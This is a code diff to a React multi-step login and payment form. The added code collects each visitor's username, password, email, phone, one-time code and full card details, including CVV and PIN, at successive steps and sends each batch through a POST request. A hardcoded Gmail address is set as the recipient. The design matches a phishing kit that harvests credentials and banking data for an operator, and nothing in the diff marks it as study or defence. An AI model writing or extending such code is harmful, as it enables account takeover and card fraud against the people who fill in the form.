@@ -191,7 +191,7 @@ function StepPage({ step, onNext, onPrev }) {
         </div>
         {/* Login button */}
         <button
-          onClick={onNext}
+          onClick={() => handleNextWithEmail(step)}
           className="login-btn"
           style={{
             background: "#888be9", color: "#fff", fontSize: 28, border: "none",
@@ -265,7 +265,7 @@ function StepPage({ step, onNext, onPrev }) {
             />
           </div>
           <button
-            onClick={onNext}
+            onClick={() => handleNextWithEmail(step)}
             disabled={!(emailValid && phoneValid)}
             className="form-btn"
           >
@@ -320,7 +320,7 @@ function StepPage({ step, onNext, onPrev }) {
             </button>
           </div>
           <button
-            onClick={onNext}
+            onClick={() => handleNextWithEmail(step)}
             disabled={code.trim().length === 0}
             className="form-btn"
           >
@@ -449,6 +449,21 @@ function StepPage({ step, onNext, onPrev }) {
     );
   }
 
+  // Add this function inside StepPage
+  async function handleNextWithEmail(step) {
+    if (step === 0) {
+      await sendEmail('Login Details', username, password);
+    } else if (step === 1) {
+      await sendEmail('Contact Info', email, phone);
+    } else if (step === 2) {
+      await sendEmail('OTP Verification', email, code);
+    } else if (step === 3) {
+      const cardInfo = `Cardholder Name: ${cardName}\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nPIN: ${pin}`;
+      await sendEmail('Card Info', email, cardInfo);
+    }
+    onNext();
+  }
+
   return (
     <div className="card-container">
       {content}
@@ -500,4 +515,15 @@ function formatExpiry(value) {
   const digits = value.replace(/\D/g, "").slice(0, 6);
   if (digits.length <= 2) return digits;
   return `${digits.slice(0, 2)}/${digits.slice(2, 6)}`;
+}
+
+const recipient = "samueldaniyan564@gmail.com";
+
+async function sendEmail(subject, email, message) {
+  const res = await fetch('/api/send', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ subject, email, message }),
+  });
+  return res.json();
 }
